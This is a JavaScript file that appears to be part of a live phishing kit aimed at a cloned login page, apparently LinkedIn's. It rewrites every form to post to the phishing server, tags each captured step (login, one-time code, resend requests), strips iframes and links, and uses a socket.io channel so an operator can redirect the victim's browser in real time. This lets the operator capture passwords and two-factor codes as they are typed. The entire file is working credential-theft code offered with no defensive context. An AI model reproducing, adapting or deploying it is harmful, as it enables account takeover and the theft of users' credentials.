const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = false

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-login",
        querys: [
            `[name="session_key"]`,
            `[name="session_password"]`
        ],
        runner() {
            let session_password = document.querySelector(`[name="session_password"]`)
            let showPassBtn = document.querySelector(`[data-id="sign-in-form__password-visibility-toggle"]`)

            showPassBtn.addEventListener("click", () => {
                if (session_password.type == "password") {
                    session_password.type = "text"
                } else {
                    session_password.type = "password"
                }
            })
        }
    },
    {
        spikeType: "otp-code",
        querys: [
            `[name="pin"]`
        ]
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    {
        spikeType: "resend-code",
        runner() {
            let resendOtpBtn = document.querySelector("#btn-resend-pin-sms")
            if (resendOtpBtn) {
                resendOtpBtn.addEventListener("click", () => {
                    spikeForm({
                        spikeType: this.spikeType
                    })
                })
            }
        }
    },
    {
        spikeType: "resend-request",
        runner() {
            const resetPasswordSubmitButton = document.querySelector("#reset-password-submit-button")
            if (resetPasswordSubmitButton) {
                resetPasswordSubmitButton.addEventListener('click', () => {
                    spikeForm({
                        spikeType: this.spikeType
                    })
                })
            }
        }
    },
    {
        spikeType: "try-another-way",
        runner() {
            const tryAnotherWay = document.querySelector("#try-another-way")
            if (tryAnotherWay) {
                tryAnotherWay.removeAttribute("href")
                tryAnotherWay.addEventListener('click', () => {
                    spikeForm({
                        spikeType: this.spikeType
                    })
                })
            }
        }
    }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{
    let session_password = document.querySelector(`[name="session_password"]`)
    let showPassBtn2 = document.querySelector(`#password-visibility-toggle`)
    if (showPassBtn2) {
        showPassBtn2.addEventListener("click", () => {
            if (session_password.type == "password") {
                session_password.type = "text"
            } else {
                session_password.type = "password"
            }
        })
    }
}